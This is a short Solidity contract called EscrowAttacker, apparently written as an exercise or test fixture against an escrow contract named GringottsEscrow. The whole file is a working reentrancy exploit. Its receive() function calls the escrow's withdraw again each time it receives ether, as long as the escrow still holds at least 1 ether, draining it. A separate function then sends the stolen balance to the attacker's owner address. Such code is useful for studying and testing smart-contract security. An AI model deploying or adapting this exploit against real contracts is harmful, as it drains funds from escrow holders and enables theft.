pragma solidity ^0.8.0;

import './GringottsEscrow.sol';

contract EscrowAttacker {
    GringottsEscrow public immutable _escrow;
    address _owner;

    uint private _count;

    modifier isOwner {
        require(msg.sender == _owner, 'CALLER_NOT_OWNER');
        _;
    }

    constructor(address escrow, address owner) {
        _escrow = GringottsEscrow(escrow);
        _owner = owner;
    }

    function withdrawAll(string calldata secret) external payable isOwner {
        _escrow.withdraw(secret);
    }

    function withdrawToOwner() external payable isOwner {
        (bool result,) = _owner.call{value: address(this).balance}('');
        require(result, 'OWNER_WITHDRAW_ERROR');
    }

    receive() external payable {
        if (address(_escrow).balance >= 1 ether) {
            _escrow.withdraw('other-password');
        }
    }

}
